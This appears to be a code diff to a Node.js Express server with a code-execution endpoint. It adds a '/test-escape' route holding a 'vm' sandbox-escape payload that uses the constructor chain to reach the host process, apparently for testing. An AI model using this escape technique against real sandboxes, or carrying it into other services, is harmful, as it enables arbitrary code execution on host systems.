@@ -59,6 +59,11 @@ app.post('/execute', (req, res) => {
 
 // Test endpoint to verify sandbox escape
 app.get('/test-escape', (_, res) => {
+    // Server error: TypeError: require(...).createContext(...).Script is not a function
+    // const escapeMethod1 =  require('vm').createContext().Script(`this.constructor.constructor("return process.pid")()`).runInContext()
+    
+    const escapeMethod1 = new (require('vm').Script)(`this.constructor.constructor("return process.platform")()`).runInThisContext();
+    
     res.json({
         message: 'If you can see this, sandbox escape was successful!',
         timestamp: new Date().toISOString(),
@@ -86,7 +91,7 @@ app.get('/', (_, res) => {
 });
 
 // Error handling
-app.use((err, _, res, _) => {
+app.use((err, _, res, resp) => {
     console.error('Server error:', err);
     res.status(500).json({
         error: 'Internal server error',
